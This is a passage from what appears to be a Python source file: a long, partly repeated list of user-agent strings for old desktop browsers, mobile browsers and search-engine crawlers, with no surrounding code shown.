               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
